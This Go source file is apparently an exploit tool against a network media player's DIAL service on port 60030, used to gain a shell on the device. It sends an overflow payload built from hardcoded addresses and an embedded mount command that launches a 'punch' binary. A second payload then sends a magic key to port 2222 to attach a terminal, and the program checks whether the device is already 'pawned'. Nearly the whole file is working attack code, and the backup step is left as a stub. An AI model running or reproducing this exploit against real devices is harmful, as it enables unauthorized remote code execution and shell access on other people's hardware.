package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"time"
)

func main() {
	// Ensure IP address is passed as an argument
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run main.go <IP_ADDRESS>")
		return
	}
	ipAddress := os.Args[1]

	// Check if anything is listening on port 2222
	if isPortOpen(ipAddress, 2222) {
		fmt.Println("player already pawned")
		return
	}

	// Check if there is a player on port 60030
	fmt.Println("Checking for player on port 60030...")
	if !isPlayerAvailable(ipAddress) {
		fmt.Println("No player detected on port 60030.")
		return
	}
	fmt.Println("Player detected on port 60030.")

	// First payload
	fmt.Println("Sending first payload to trigger the exploit...")
	err := sendFirstPayload(ipAddress)
	if err != nil {
		fmt.Printf("Error sending first payload: %v\n", err)
		return
	}

	// Wait for a moment before sending the second payload
	fmt.Println("Waiting for the 'punch' binary to be ready on port 2222...")
	time.Sleep(5 * time.Second) // Adjust the wait time as necessary

	// Check if the punch binary is ready on port 2222
	if !isPortOpen(ipAddress, 2222) {
		fmt.Println("No player at the given IP or punch binary not ready on port 2222.")
		return
	}

	// Second payload
	fmt.Println("Sending second payload to authenticate and attach terminal...")
	err = sendSecondPayload(ipAddress)
	if err != nil {
		fmt.Printf("Error sending second payload: %v\n", err)
		return
	}

	fmt.Println("Payloads sent successfully!")

	// Prompt user to back up the player
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Do you want to backup your player? (yes/no): ")
	response, _ := reader.ReadString('\n')
	if response == "yes\n" {
		fmt.Println("Backing up the player...")
		// Add your backup logic here
	} else {
		fmt.Println("Player backup skipped.")
	}
}

func isPortOpen(ip string, port int) bool {
	address := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", address, 2*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func isPlayerAvailable(ip string) bool {
	address := fmt.Sprintf("%s:60030", ip)
	conn, err := net.DialTimeout("tcp", address, 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	getRequest := "GET /dial_srv/apps/hello HTTP/1.1\r\nHost: " + ip + ":60030\r\nConnection: close\r\n\r\n"
	_, err = conn.Write([]byte(getRequest))
	if err != nil {
		return false
	}

	response := make([]byte, 1024)
	_, err = conn.Read(response)
	if err != nil {
		return false
	}

	return true
}

func sendFirstPayload(ip string) error {
	// The first payload string that triggers the exploit
	firstPayload := "POST /dial_srv/apps/qwertyuioppoMMMMHHHHLLLLOOOOPPPPiiiiiiiiCCCCDDDDRRRR\xc5\x26\x05\x28\xa9\xc2\x0f\x28\xff\xff\xff\xff\xff\xff\xff\xff\xa9\xc2\x0f\x28\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xa3\xe3\x09\x28\xff\xff\xff\xff\xff\xff\xff\xff\xfc\x0e\x62\x35\xff\xff\xff\xff\x0d\x1f\x06\x28\x8b\xf1\x0a\x28\xc5\x1f\x10\x28\xb7\x32\x10\x28\xed\x4c\x12\x28\x9c\xd7\x10\x28\x1c\x9e\x11\x28\xff\xff\xff\xff\x7b\xf8\x0e\x28\xfc\x0e\x62\x35\xa9\xc2\x0f\x28\xff\xff\xff\xff\xff\xff\xff\xff\x41\x8d\x08\x28\x93\x70\x0f\x28\xff\xff\xff\xff\xa9\xc2\x0f\x28\xb1\xc2\x0f\x28\xa9\xc2\x0f\x28\xb1\xc2\x0f\x28\xa9\xc2\x0f\x28\xd3\x7a\x10\x28\x23\x6d\x6f\x75\x6e\x74\x25\x31\x24\x73\x2f\x64\x65\x76\x2f\x73\x64\x61\x31\x25\x31\x24\x73\x2f\x6d\x6e\x74\x2f\x75\x73\x62\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x23\x23\xa9\xde\x07\x28 HTTP/1.1\r\nHost: " + ip + ":60030\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"

	// Connect to the IP on port 60030
	conn, err := net.Dial("tcp", ip+":60030")
	if err != nil {
		return err
	}
	defer conn.Close()

	// Send the first payload
	_, err = conn.Write([]byte(firstPayload))
	return err
}

func sendSecondPayload(ip string) error {
	// The second payload string that sends the magic key for punch authentication
	secondPayload := "\x9f\xbe\x9b\x17\x3b\x18\xee\x01\x82\xea\x35\x9f\xa7\x60\x12\x4c"

	// Connect to the IP on port 2222 (where punch binary is listening)
	conn, err := net.Dial("tcp", ip+":2222")
	if err != nil {
		return err
	}
	defer conn.Close()

	// Send the second payload
	_, err = conn.Write([]byte(secondPayload))
	return err
}
